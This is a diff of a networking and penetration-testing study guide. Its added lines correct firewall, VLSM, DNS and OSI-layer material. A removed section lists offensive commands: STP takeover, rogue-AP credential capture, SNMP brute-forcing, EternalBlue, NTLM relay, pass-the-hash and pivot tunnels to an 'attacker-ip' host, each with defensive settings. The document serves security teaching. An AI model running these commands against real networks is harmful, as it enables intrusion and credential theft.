 
 #### 17.2.3 Third Generation: Application Layer / Proxy Firewalls
@@ -8848,11 +8585,13 @@ SRC_IP         DST_IP        SRC_PORT  DST_PORT  STATE        PROTO
 - Full protocol inspection and validation
 
 **2. Circuit-Level Gateway:**
-- Operates between the Network and Transport layers — verifies the TCP handshake establishes a legitimate connection, then relays the byte stream without inspecting application content
-- Does NOT parse application-level commands; it only validates that the TCP circuit was properly established
-- Creates a transparent relay: once the circuit is validated, data passes through directly
+- Operates between the Network and Session layers (L3–L5)
+- Verifies that the TCP handshake is legitimate before passing the connection
+- Does **not** inspect application-layer payload — just validates that a proper TCP session was established, then relays the byte stream
+- Once the circuit is validated, operates as a transparent relay (no application awareness)
+- **Classic example:** Early DEC SEAL firewall
 
-> **⚠️ SOCKS ≠ Circuit-Level Gateway:** SOCKS (Socket Secure) is an **application-layer tunnel proxy** protocol. It understands application commands (CONNECT, BIND, UDP ASSOCIATE) and operates at the application layer. Calling SOCKS a "circuit-level gateway" is a common textbook error. A true circuit-level gateway (Cheswick/Bellovin definition) relays TCP streams without any application-layer command parsing.
+> **SOCKS vs Circuit-Level Gateway distinction:** A SOCKS proxy (SOCKS4/SOCKS5) is an **application-layer proxy** — it uses explicit application-level commands (CONNECT, BIND, UDP ASSOCIATE) and understands the SOCKS protocol. It is NOT a circuit-level gateway. A true circuit-level gateway is protocol-agnostic at the application level and does not parse any application protocol. Do not confuse the two in exam or interview contexts.
 
 **Deep Packet Inspection (DPI):**
 - Examines payload content, not just headers
@@ -9114,10 +8853,10 @@ Internet <--> [External FW] <--> DMZ (web, email servers) <--> [Internal FW] <--
 
 **Technique:** Split malicious payload across multiple IP fragments so the IDS or firewall never sees the complete attack signature in a single packet.
 
-**Modern context:** All current stateful firewalls and NGFW devices (Palo Alto, Fortinet, Check Point, Cisco ASA) reassemble IP fragments before inspection — this has been standard practice for over 20 years. Fragment-based evasion is primarily effective against:
-- Older or embedded firewalls running basic packet-filter ACLs (no state)
-- Some IDS/IPS sensors that process individual packets without full reassembly
-- IPv6 fragmentation on security devices that handle IPv4 and IPv6 fragment reassembly differently
+**Modern context:** Fragment-based evasion does **not work against modern stateful firewalls** — all production stateful firewalls and NGFW devices (Palo Alto, Fortinet, Check Point, Cisco ASA) reassemble IP fragments before inspection, and have done so for over 20 years. This technique is documented here for historical understanding. In the field it may still be relevant against:
+- Legacy or embedded devices running basic packet-filter ACLs without state
+- Some IDS/IPS sensors configured for single-packet analysis without full reassembly
+- IPv6 fragment handling inconsistencies on older security devices
 
 **Tools:** fragroute (last release 2001 — largely historical), Scapy (current, allows crafting overlapping fragments)
 
@@ -9865,34 +9604,48 @@ Example /24:
 - 2 subnets with 50 hosts each
 - 3 subnets with 10 hosts each
 
-> **⚠️ Common textbook error corrected:** A /24 (254 hosts total) cannot satisfy this scenario. After allocating /25 (100h) + /26 (50h) + /26 (50h) the entire /24 is consumed. No address space remains for the three /28s. Using 192.168.0.0/22 (1022 usable hosts) gives enough room.
+> **Why 192.168.0.0/23?** The original /24 example had a fundamental error: after allocating .0/25 (100 hosts), .128/26 (50 hosts), and .192/26 (50 hosts), the /24 address space is **completely exhausted** — there is no room left for the three /28 subnets. A /23 (512 addresses) provides the necessary space.
 
-**Starting with 192.168.0.0/22 (255.255.252.0):**
+**Starting with 192.168.0.0/23 (512 addresses, 192.168.0.0 – 192.168.1.255):**
 
-**Allocation (largest-first — always allocate largest subnets first):**
+**VLSM Allocation (largest subnets first):**
 ```
-Step 1: 100 hosts → need /25 (2^7 - 2 = 126 hosts)
-        → 192.168.0.0/25   (range: .0.1 – .0.126, broadcast .0.127)
+Step 1 — 100 hosts → need /25 (126 usable) → 192.168.0.0/25
+         Range: 192.168.0.1 – 192.168.0.126   Broadcast: 192.168.0.127
+         Remaining space starts at: 192.168.0.128
 
-Step 2: 50 hosts → need /26 (2^6 - 2 = 62 hosts)
-        → 192.168.0.128/26 (range: .0.129 – .0.190, broadcast .0.191)
+Step 2 — 50 hosts  → need /26 (62 usable)  → 192.168.0.128/26
+         Range: 192.168.0.129 – 192.168.0.190  Broadcast: 192.168.0.191
+         Remaining space starts at: 192.168.0.192
 
-Step 3: 50 hosts → need /26 (62 hosts)
-        → 192.168.0.192/26 (range: .0.193 – .0.254, broadcast .0.255)
+Step 3 — 50 hosts  → need /26 (62 usable)  → 192.168.0.192/26
+         Range: 192.168.0.193 – 192.168.0.254  Broadcast: 192.168.0.255
+         Remaining space starts at: 192.168.1.0
 
-Step 4: 10 hosts → need /28 (2^4 - 2 = 14 hosts)
-        → 192.168.1.0/28   (range: .1.1 – .1.14, broadcast .1.15)
+Step 4 — 10 hosts  → need /28 (14 usable)  → 192.168.1.0/28
+         Range: 192.168.1.1 – 192.168.1.14    Broadcast: 192.168.1.15
 
-Step 5: 10 hosts → /28 (14 hosts)
-        → 192.168.1.16/28  (range: .1.17 – .1.30, broadcast .1.31)
+Step 5 — 10 hosts  → need /28 (14 usable)  → 192.168.1.16/28
+         Range: 192.168.1.17 – 192.168.1.30   Broadcast: 192.168.1.31
 
-Step 6: 10 hosts → /28 (14 hosts)
-        → 192.168.1.32/28  (range: .1.33 – .1.46, broadcast .1.47)
+Step 6 — 10 hosts  → need /28 (14 usable)  → 192.168.1.32/28
+         Range: 192.168.1.33 – 192.168.1.46   Broadcast: 192.168.1.47
 
-Remaining space: 192.168.1.48 onward (still within .0/22) — unallocated for future growth
+Unused: 192.168.1.48 – 192.168.1.255 (available for future growth)
 ```
 
-**Why largest-first?** If you allocate small subnets first they may not fall on proper boundaries for larger subnets, wasting addresses. Always allocate from largest to smallest requirement.
+**Verification — no overlap:**
+
+| Subnet | Network | Usable Range | Broadcast | Hosts |
+|--------|---------|--------------|-----------|-------|
+| 100-host | 192.168.0.0/25 | .0.1 – .0.126 | .0.127 | 126 |
+| 50-host A | 192.168.0.128/26 | .0.129 – .0.190 | .0.191 | 62 |
+| 50-host B | 192.168.0.192/26 | .0.193 – .0.254 | .0.255 | 62 |
+| 10-host A | 192.168.1.0/28 | .1.1 – .1.14 | .1.15 | 14 |
+| 10-host B | 192.168.1.16/28 | .1.17 – .1.30 | .1.31 | 14 |
+| 10-host C | 192.168.1.32/28 | .1.33 – .1.46 | .1.47 | 14 |
+
+**VLSM Rule:** Always allocate **largest subnets first**, on proper boundaries. This prevents fragmentation and guarantees non-overlapping ranges.
 
 **Benefits:**
 - Minimizes wasted IP addresses
@@ -10616,9 +10369,9 @@ After this section, you'll understand:
 - Enables CDNs (Content Delivery Networks) to serve from nearest location
 
 **Statistics:**
-- Root DNS servers handle trillions of queries daily
+- Recursive resolvers (ISP DNS, 8.8.8.8, 1.1.1.1) handle the vast majority of DNS queries. Root servers are only consulted for cache misses on TLD delegations — TLD NS records have long TTLs and are aggressively cached, so root server query volume is a small fraction of total DNS traffic.
 - Cached queries resolve in milliseconds
-- 13 root server **identities** (A through M, a.root-servers.net through m.root-servers.net) — but each is served by **hundreds of physical servers** worldwide using anycast routing. As of 2024 there are 1,800+ actual root server instances. The number 13 is a historical artifact of the 512-byte UDP DNS limit, not a physical count.
+- **13 root server *identities*** (A through M, a.root-servers.net through m.root-servers.net) — but each identity is served by **hundreds of physical servers** worldwide using **anycast routing**. As of 2024, there are 1,800+ root server instances globally. The number 13 is a historical artifact of the 512-byte UDP limit in early DNS (RFC 1035, 1987), not a reflection of the actual physical infrastructure.
 
 ### 19.2 DNS Resolution Process
 
@@ -11380,493 +11133,6 @@ During an incident response, you'll use this consolidated knowledge to trace an 
 
 ---
 
-
----
-
-## 20. Critical Missing Protocols — Security-Essential Reference
-
-> **Why this section exists:** The learning path targets Penetration Testing and Red Teaming. The protocols in this section are either primary attack surfaces (SMB, SNMP), authentication infrastructure (802.1X, Kerberos), foundational network stability mechanisms (STP), or essential VPN/tunneling technology (IPsec). They were absent from earlier sections and are added here as targeted deep-dives.
-
----
-
-### 20.1 Spanning Tree Protocol (STP / RSTP)
-
-**Section Overview:**
-STP prevents Layer 2 loops in switched networks. It is foundational to understand switch behaviour, and STP manipulation is a real attack vector for gaining network access or causing disruption.
-
-**Why STP Exists:**
-Switches forward frames based on MAC addresses. If a network has redundant paths (loops), frames can circulate forever — a broadcast storm that saturates bandwidth and crashes the network. STP detects loops and logically blocks redundant links.
-
-**How STP Works (802.1D):**
-
-1. **Root Bridge Election:** All switches exchange Bridge Protocol Data Units (BPDUs). The switch with the lowest Bridge ID (priority + MAC) becomes the Root Bridge.
-2. **Port Roles assigned per bridge:**
-   - **Root Port (RP):** Best path toward the Root Bridge — one per non-root switch
-   - **Designated Port (DP):** Sends BPDUs on a segment — one per segment
-   - **Blocked Port (Non-Designated):** Discards frames to break loops
-3. **Path Cost:** Based on bandwidth (100 Mbps = cost 19, 1 Gbps = cost 4, 10 Gbps = cost 2)
-4. **Port States:** Blocking → Listening → Learning → Forwarding (802.1D takes 30-50 seconds to converge)
-
-**RSTP (Rapid STP, 802.1W):**
-- Converges in 1-2 seconds (versus 30-50s for classic STP)
-- Port roles: Root, Designated, Alternate (backup root port), Backup
-- Replaces 802.1D in all modern networks; MSTP (802.1s) extends RSTP for multiple VLANs
-
-**Security Relevance:**
-
-```
-STP Attack: Root Bridge Takeover
-
-An attacker connected to a switch sends BPDUs with a lower Bridge ID
-(e.g., priority 0) than the legitimate root bridge. All switches
-recalculate paths with the attacker as root → all traffic flows
-through the attacker's device → full MITM without ARP poisoning.
-
-Attack tool:
-  yersinia -G   # Select STP → "Claiming Root Role"
-  # Or with Scapy: craft BPDUs with priority 0
-
-Defense:
-  - Portfast + BPDU Guard on access ports:
-      If a BPDU is received on a Portfast-enabled port, the port
-      is immediately err-disabled — prevents rogue switches/devices
-  - Root Guard: Prevents a port from becoming a Root Port even if
-      it receives superior BPDUs
-  
-  Cisco config:
-    interface GigabitEthernet0/1
-      spanning-tree portfast
-      spanning-tree bpduguard enable
-    ! Global:
-    spanning-tree portfast bpduguard default
-```
-
-**Key Commands (Cisco):**
-```
-show spanning-tree                 ! Per-VLAN STP state
-show spanning-tree detail          ! Root bridge, port costs
-show spanning-tree blockedports    ! Which ports are blocking
-debug spanning-tree events         ! Live STP activity
-```
-
-**Key Takeaway:** STP is invisible until it breaks. In a pentest, sending superior BPDUs from a connected device can redirect all switch traffic through you — a physical-access MITM attack. BPDU Guard is the primary defense.
-
----
-
-### 20.2 802.1X and EAP — Network Access Control
-
-**Section Overview:**
-802.1X is the IEEE standard for port-based Network Access Control (NAC). It is the authentication mechanism behind enterprise Wi-Fi (WPA2/WPA3-Enterprise) and wired switch port authentication. For red teams, understanding 802.1X is necessary for bypassing it; for blue teams, it is the strongest Layer 2 admission control available.
-
-**Three Components:**
-- **Supplicant:** The client device requesting access (laptop, phone)
-- **Authenticator:** The network device controlling access (switch port, Wi-Fi AP)
-- **Authentication Server:** RADIUS server (FreeRADIUS, Microsoft NPS) that validates credentials
-
-**Protocol Flow:**
-```
-Supplicant           Authenticator (Switch)       RADIUS Server
-    │                       │                           │
-    │── EAPOL-Start ────────>│                           │
-    │<─ EAP-Request/Identity ─│                           │
-    │── EAP-Response/Identity ─>│── RADIUS Access-Request ──>│
-    │                       │<── RADIUS Access-Challenge ──│
-    │<─ EAP-Request ──────────│                           │
-    │── EAP-Response ──────────>│── RADIUS Access-Request ──>│
-    │                       │<── RADIUS Access-Accept ────│
-    │<─ EAP-Success ──────────│                           │
-    │   [Port Authorized]     │                           │
-```
-
-**EAP Methods (listed from weakest to strongest):**
-
-| Method | Authentication | Security | Notes |
-|--------|---------------|----------|-------|
-| EAP-MD5 | Password (challenge-response) | ❌ Weak | Offline dictionary attack possible; no server auth |
-| LEAP (Cisco) | Username/password | ❌ Broken | Offline dictionary attack; deprecated |
-| EAP-TLS | Mutual certificate | ✅ Strong | Both client and server have certificates; gold standard |
-| EAP-TTLS | Server cert + inner auth | ✅ Good | Server cert only; inner auth (MSCHAPv2, PAP) tunneled |
-| PEAP | Server cert + inner auth | ✅ Good | Most common enterprise deployment; inner MSCHAPv2 |
-
-**PEAP/MSCHAPv2 Attack — The Common Enterprise Wi-Fi Attack:**
-```
-Attack vector: Rogue AP with valid-looking (or self-signed) certificate
-
-1. Attacker deploys rogue AP with SSID matching corporate network
-2. Client connects and initiates PEAP
-3. Attacker presents self-signed certificate
-4. If client does NOT validate server certificate → accepts rogue cert
-5. Attacker captures MSCHAPv2 challenge-response
-6. Offline crack with hashcat: hashcat -m 5500 ntlm_hash.txt wordlist.txt
-   (or use asleap for LEAP hashes)
-
-Fix: Always validate server certificate AND pin the CA in client supplicant config.
-     Without certificate validation, PEAP provides false security.
-
-Tools:
-  hostapd-wpe    # Rogue AP for PEAP/EAP credential capture
-  asleap         # LEAP hash cracker
-  eaphammer      # Modern EAP attack framework
-```
-
-**802.1X Bypass Techniques:**
-- **MAC Authentication Bypass (MAB):** Devices that can't do 802.1X (printers, VoIP) fall back to MAC-based auth. Spoof a known-good MAC address of such a device.
-- **Identity theft:** In EAP-TTLS/PEAP, the outer identity is sent in cleartext before the TLS tunnel. The real username is protected inside the tunnel, but the outer identity can reveal domain/username patterns.
-- **VLAN hopping post-auth:** After authenticating on a guest VLAN, attempt to access data VLANs via trunk misconfigurations.
-
-**Defense Configuration (Cisco):**
-```
-aaa new-model
-aaa authentication dot1x default group radius
-dot1x system-auth-control
-
-interface GigabitEthernet0/1
-  switchport mode access
-  authentication port-control auto
-  dot1x pae authenticator
-  mab                          ! Fallback MAC auth for non-802.1X devices
-  authentication order dot1x mab
-  authentication priority dot1x mab
-```
-
----
-
-### 20.3 SNMP — Simple Network Management Protocol
-
-**Section Overview:**
-SNMP is the primary network device management protocol. For attackers it is a reconnaissance goldmine — SNMP can expose entire device configurations, routing tables, interface lists, and connected devices. For defenders, securing SNMP is a basic hardening requirement that is frequently missed.
-
-**How SNMP Works:**
-- **Manager:** The monitoring system (SolarWinds, PRTG, Nagios) that queries devices
-- **Agent:** The daemon running on managed devices (routers, switches, servers) that responds to queries
-- **MIB (Management Information Base):** Hierarchical database of manageable objects on each device
-- **OID (Object Identifier):** Unique dotted path to a specific MIB object (e.g., `1.3.6.1.2.1.1.1.0` = sysDescr)
-
-**SNMP Versions:**
-
-| Version | Authentication | Encryption | Status |
-|---------|---------------|-----------|--------|
-| **SNMPv1** | Community string (cleartext) | None | ⛔ Insecure; legacy only |
-| **SNMPv2c** | Community string (cleartext) | None | ⚠️ Most common; still insecure |
-| **SNMPv3** | Username + auth (MD5/SHA) | DES/AES | ✅ Secure; use this |
-
-**Community Strings (v1/v2c):**
-- **Public:** Read-only access (default on most devices — almost always left unchanged)
-- **Private:** Read-write access (default on most devices — allows config changes)
-- Sent in **cleartext** over UDP — sniffable on the wire
-
-**Offensive SNMP (Red Team):**
-```bash
-# Brute-force community strings
-onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 192.168.1.1
-
-# SNMPwalk — dump entire MIB tree (requires known community string)
-snmpwalk -v2c -c public 192.168.1.1
-
-# Get specific OID — system description
-snmpget -v2c -c public 192.168.1.1 1.3.6.1.2.1.1.1.0
-
-# Dump all interfaces
-snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.2.2.1.2
-
-# Dump routing table
-snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.4.21
-
-# Dump ARP table (reveals all IP/MAC pairs the device knows)
-snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.4.22
-
-# nmap SNMP enumeration scripts
-nmap -sU -p 161 --script snmp-info,snmp-interfaces,snmp-netstat,snmp-sysdescr 192.168.1.1
-
-# Metasploit SNMP scanner
-use auxiliary/scanner/snmp/snmp_enumifaces
-use auxiliary/scanner/snmp/snmp_enum
-```
-
-**What SNMP Exposes:**
-- Device model, OS version, uptime (fingerprinting)
-- All interface names, IPs, MACs, speeds
-- Routing table (internal network map)
-- ARP cache (all local hosts)
-- Running processes and installed software (MIB-II host resources)
-- SNMP write access = change device configuration (e.g., add a default route pointing to attacker)
-
-**Defense:**
-```
-! Cisco — disable SNMPv1/v2c, use SNMPv3
-no snmp-server community public
-no snmp-server community private
-snmp-server group SECUREGRP v3 priv
-snmp-server user SNMPUSER SECUREGRP v3 auth sha MyAuthPass priv aes 128 MyPrivPass
-
-! Restrict SNMP access with ACL
-access-list 10 permit 192.168.1.10    ! Only management station
-snmp-server community STRONGSTRING ro 10
-
-! Firewall: Block UDP 161 from all but management hosts
-```
-
-**Key Takeaway:** Default community strings ("public"/"private") on UDP port 161 are an immediate critical finding in any pentest. SNMPv3 with auth+priv is the only secure version.
-
----
-
-### 20.4 IPsec — IP Security Architecture
-
-**Section Overview:**
-IPsec is the framework for authenticating and encrypting IP traffic. It is the foundation of site-to-site VPNs and remote access VPNs. Understanding IPsec is essential for both attacking VPN configurations and understanding network tunneling for red team infrastructure.
-
-**IPsec Components:**
-
-| Component | Purpose |
-|-----------|---------|
-| **AH (Authentication Header, Protocol 51)** | Integrity + authentication; NO encryption |
-| **ESP (Encapsulating Security Payload, Protocol 50)** | Encryption + integrity + authentication |
-| **IKE (Internet Key Exchange, UDP 500/4500)** | Key negotiation and SA establishment |
-| **SA (Security Association)** | One-way agreement on algorithm, keys, and SPI |
-
-**Two Modes:**
-- **Transport Mode:** Encrypts payload only; original IP header preserved. Used between two end hosts.
-- **Tunnel Mode:** Encrypts entire original packet and adds new IP header. Used for VPNs (original packet hidden inside new packet).
-
-```
-Transport Mode:  [Original IP Header][AH/ESP][Original Payload]
-Tunnel Mode:     [New IP Header][AH/ESP][Original IP Header][Original Payload]
-```
-
-**IKE Phases:**
-
-**IKEv1 (legacy):**
-- Phase 1: Establish secure channel (ISAKMP SA) using Diffie-Hellman
-- Phase 2: Negotiate IPsec SAs for actual data protection
-
-**IKEv2 (modern, RFC 7296):**
-- Single exchange: IKE_SA_INIT + IKE_AUTH → faster and more efficient
-- Built-in NAT-T (NAT Traversal), EAP authentication support, MOBIKE for mobile clients
-
-**Common VPN Configurations:**
-```bash
-# Identify IPsec endpoints (IKE on UDP 500)
-nmap -sU -p 500,4500 192.168.1.1
-
-# IKE fingerprinting / enumeration
-ike-scan 192.168.1.1
-ike-scan --aggressive --id=vpnclient 192.168.1.1
-
-# Test for IKEv1 aggressive mode (sends PSK hash in cleartext → offline crack)
-ike-scan --aggressive --id=0.0.0.0 192.168.1.1
-```
-
-**Security Issues:**
-
-| Issue | Risk |
-|-------|------|
-| **IKEv1 Aggressive Mode** | PSK hash sent before encryption; offline dictionary attack possible |
-| **Weak PSK (Pre-Shared Key)** | Offline cracking of captured IKE handshake (psk-crack, hashcat) |
-| **DH Group 1/2 (768/1024-bit)** | Computationally breakable; use Group 14 (2048-bit) or higher |
-| **Null encryption** | Some configs allow NULL encryption for debugging — no protection |
-| **Split tunneling misconfiguration** | Traffic bypasses VPN, leaks to internet |
-
-**Defense:**
-- Use IKEv2 (deprecate IKEv1)
-- Disable aggressive mode on IKEv1 deployments
-- Use certificate authentication instead of PSK for site-to-site
-- Use strong DH groups (≥ Group 14)
-- Deploy with Perfect Forward Secrecy (PFS) enabled
-
----
-
-### 20.5 SMB — Server Message Block
-
-**Section Overview:**
-SMB is the Windows file-sharing and network services protocol. It runs on TCP 445 and (legacy) TCP 139. SMB is one of the highest-value targets in internal pentests: it exposes file shares, user enumeration, relay attack vectors, and has been the delivery mechanism for major exploits (EternalBlue, WannaCry). Understanding the protocol is essential before touching any Windows environment.
-
-**SMB Versions:**
-
-| Version | OS Support | Security | Notes |
-|---------|-----------|---------|-------|
-| **SMBv1** | Windows XP, 2000, 2003 | ⛔ Broken | Remove immediately; EternalBlue (MS17-010) exploits this |
-| **SMBv2** | Vista, Server 2008+ | ⚠️ Better | No more plaintext passwords; signing optional |
-| **SMBv2.1** | Win 7, Server 2008 R2+ | ⚠️ Better | Added opportunistic locking |
-| **SMBv3** | Win 8, Server 2012+ | ✅ Good | Encryption support (AES-CCM, AES-GCM) |
-| **SMBv3.1.1** | Win 10, Server 2016+ | ✅ Best | Mandatory pre-authentication integrity; AES-128-GCM |
-
-**SMB Authentication Methods:**
-- **NTLMv1:** Challenge-response using NT hash; **broken** — do not use
-- **NTLMv2:** Improved challenge-response with timestamp; still crackable offline
-- **Kerberos:** Default in Active Directory environments; ticket-based; no password hash sent over wire
-
-**Critical SMB Attacks:**
-
-```bash
-# ─── ENUMERATION ──────────────────────────────────────────
-
-# List shares (no credentials)
-smbclient -L //192.168.1.10 -N
-
-# Null session enumeration
-enum4linux -a 192.168.1.10
-
-# nmap SMB scripts
-nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-vuln-ms17-010 192.168.1.10
-
-# CrackMapExec — Swiss army knife for SMB
-crackmapexec smb 192.168.1.0/24                        # Enumerate all hosts
-crackmapexec smb 192.168.1.0/24 -u admin -p Password1  # Spray credentials
-crackmapexec smb 192.168.1.0/24 --shares               # Enumerate shares
-
-# ─── EXPLOITATION ─────────────────────────────────────────
-
-# EternalBlue (MS17-010) — SMBv1 exploit
-msfconsole
-use exploit/windows/smb/ms17_010_eternalblue
-set RHOSTS 192.168.1.10
-run
-
-# ─── RELAY ATTACKS ────────────────────────────────────────
-# NTLM Relay: Capture NTLMv2 challenge-response and relay to another host
-# Requires: SMB signing disabled on target
-
-# Step 1: Disable SMB and HTTP in Responder to avoid consuming the hash
-# Edit /etc/responder/Responder.conf: SMB = Off, HTTP = Off
-sudo responder -I eth0 -rdw
-
-# Step 2: Relay with ntlmrelayx
-sudo impacket-ntlmrelayx -tf targets.txt -smb2support
-
-# What happens: Responder poisons LLMNR/NBT-NS → victim authenticates to attacker
-# → attacker relays auth to target → gains SMB session as victim's user
-
-# ─── PASS-THE-HASH ────────────────────────────────────────
-# Use captured NT hash without cracking it
-impacket-psexec administrator@192.168.1.10 -hashes :NTHASH
-crackmapexec smb 192.168.1.10 -u administrator -H NTHASH --exec-method smbexec
-```
-
-**SMB Signing:**
-When SMB signing is **disabled** (common on workstations, not servers), NTLM relay attacks work. When **enabled**, relayed auth is rejected because the signature won't match.
-
-```bash
-# Check SMB signing status
-nmap -p 445 --script smb2-security-mode 192.168.1.0/24
-crackmapexec smb 192.168.1.0/24 --gen-relay-list unsigned_targets.txt
-```
-
-**Defense:**
-- Disable SMBv1 everywhere (Group Policy: `Set-SmbServerConfiguration -EnableSMB1Protocol $false`)
-- Enable SMB signing on all hosts (mandatory, not just opportunistic)
-- Block TCP 445 at perimeter and between network segments
-- Enable SMB encryption (SMBv3)
-- Use Kerberos authentication (requires domain environment)
-
----
-
-### 20.6 Network Pivoting and Port Forwarding
-
-**Section Overview:**
-Pivoting is the technique of using a compromised host as a relay to reach otherwise-inaccessible network segments. It is a core red team skill for post-exploitation lateral movement. Understanding the network layer mechanics of pivoting requires the foundational protocol knowledge covered throughout this document.
-
-**Why Pivoting is Necessary:**
-```
-Attacker (Internet)
-       │
-       │  Direct access blocked by firewall
-       ▼
-[DMZ Host — Compromised]   ← Attacker has shell here
-       │
-       │  Internal segment not directly reachable from Internet
-       ▼
-[Internal Network 10.0.0.0/8]   ← Attacker wants to reach this
-```
-
-**Pivoting Techniques:**
-
-#### Local Port Forwarding (SSH)
-Forward a port on the attacker's machine to a port on an internal host (through the pivot).
-```bash
-# Access internal RDP (10.0.0.5:3389) via pivot (pivot-host):
-ssh -L 13389:10.0.0.5:3389 user@pivot-host
-
-# Now connect: rdesktop localhost:13389  → reaches 10.0.0.5:3389
-```
-
-#### Remote Port Forwarding (SSH)
-Forward a port on the pivot to the attacker's machine. Useful for reverse shells.
-```bash
-# On pivot host: forward attacker's port 4444 to be reachable on pivot:
-ssh -R 4444:localhost:4444 attacker@attacker-ip
-
-# Reverse shell on internal host connects to pivot:4444 → attacker:4444
-```
-
-#### Dynamic Port Forwarding / SOCKS Proxy (SSH)
-Create a SOCKS5 proxy on the attacker machine; all traffic through it is tunneled via the pivot.
-```bash
-# Create SOCKS5 proxy on attacker port 1080 via pivot:
-ssh -D 1080 user@pivot-host
-
-# Route tools through it:
-proxychains nmap -sT 10.0.0.0/24           # Scan internal network
-proxychains crackmapexec smb 10.0.0.5      # SMB through pivot
-```
-
-#### Metasploit Pivoting
-```bash
-# After getting a Meterpreter session on pivot host:
-meterpreter > run post/multi/manage/autoroute SUBNET=10.0.0.0 NETMASK=255.0.0.0
-
-# Now route attacks through the pivot:
-meterpreter > background
-msf > use auxiliary/scanner/portscan/tcp
-msf > set RHOSTS 10.0.0.0/24
-msf > run
-```
-
-#### Chisel (HTTP/HTTPS Tunneling)
-When SSH is blocked but HTTP/HTTPS is allowed:
-```bash
-# On attacker (server mode):
-./chisel server -p 8080 --reverse
-
-# On pivot host (client mode):
-./chisel client attacker-ip:8080 R:socks
-
-# Routes all traffic through port 8080 HTTP — bypasses firewalls that only allow web traffic
-```
-
-#### Ligolo-ng (Modern Pivoting)
-```bash
-# Server on attacker:
-./proxy -selfcert -laddr 0.0.0.0:11601
-
-# Agent on pivot:
-./agent -connect attacker-ip:11601 -ignore-cert
-
-# In ligolo UI:
-session
-start
-# Creates tun interface on attacker routable to internal network — no proxychains needed
-```
-
-**Port Forwarding Without SSH (Windows):**
-```cmd
-REM netsh portproxy — Windows native
-netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=10.0.0.5 connectport=80
-
-REM Verify:
-netsh interface portproxy show all
-```
-
-**Detection of Pivoting:**
-- Unusual SSH connections from internal hosts to external IPs
-- Internal hosts making connections to ports typically only used externally (8080, 443, 11601)
-- SOCKS proxy traffic patterns: many connections through single TCP session
-- Netflow anomalies: high connection count through one host
-- EDR alerts on chisel/ligolo binary execution
-
-**Key Takeaway:** A pivot transforms a single foothold into a network-wide attack platform. Every additional subnet reachable through your pivot multiplies your attack surface. Network segmentation (firewalls between segments, not just at the perimeter) is the primary defense.
-
----
-
 ## 20. Summary — Key Takeaways and Next Steps
 
 **Learning Outcomes:**
@@ -12612,17 +11878,17 @@ Subnets:
 
 ### A.5 OSI Layer Quick Reference
 
-| Layer | # | Name | PDU | Devices | Protocols | Function |
-|-------|---|------|-----|---------|-----------|----------|
-| 7 | Application | Data | - | HTTP, FTP, SMTP, DNS | User interface |
-| 6 | Presentation | Data | - | JPEG, GIF, ASCII, EBCDIC, encryption/encoding formats | Data format (translation, compression, encryption negotiation) |
+| # | Name | PDU | Devices | Protocols | Function |
+|---|------|-----|---------|-----------|----------|
+| 7 | Application | Data | — | HTTP, FTP, SMTP, DNS, TLS/SSL* | User interface; application protocols |
+| 6 | Presentation | Data | — | JPEG, MPEG, ASCII, encryption formats | Data format, encoding, compression |
+| 5 | Session | Data | — | NetBIOS, RPC, SOCKS | Session establishment and management |
+| 4 | Transport | Segment | — | TCP, UDP, SCTP | End-to-end delivery, port addressing |
+| 3 | Network | Packet | Router, L3 Switch | IP, ICMP, OSPF, BGP | Routing, logical addressing |
+| 2 | Data Link | Frame | Switch, Bridge | Ethernet, Wi-Fi (802.11), PPP, ARP | Local delivery, MAC addressing |
+| 1 | Physical | Bit | Hub, Repeater, Cable, NIC | — | Physical transmission (electrical, optical, RF) |
 
-> **TLS/SSL placement note:** TLS is commonly placed at Layer 6 in OSI teaching models, but in real implementations it does not conform to the OSI Presentation Layer. TLS operates between TCP (Layer 4) and the application. In any practical or exam context, treat TLS as an application-layer protocol unless the exam specifically uses the OSI teaching model. See the TLS deep-dive section for full detail.
-| 5 | Session | Data | - | NetBIOS, RPC | Session management |
-| 4 | Transport | Segment | - | TCP, UDP | End-to-end delivery |
-| 3 | Network | Packet | Router | IP, ICMP, OSPF | Routing |
-| 2 | Data Link | Frame | Switch, Bridge | Ethernet, Wi-Fi, PPP | Local delivery |
-| 1 | Physical | Bit | Hub, Repeater, Cable | - | Physical transmission |
+> **\*TLS/SSL placement note:** TLS is listed at Layer 7 here because it operates on top of TCP and provides services to Application Layer protocols (HTTPS, SMTPS, etc.). It does NOT implement the OSI Presentation Layer data format abstraction. Some textbooks and exams place TLS at Layer 6 for teaching simplicity. In real TCP/IP implementations, there is no Presentation Layer — TLS sits between TCP (L4) and the application, functionally at L7. See Section 9.3.6 for the full discussion.
 
 ### A.6 TCP vs UDP Comparison
 
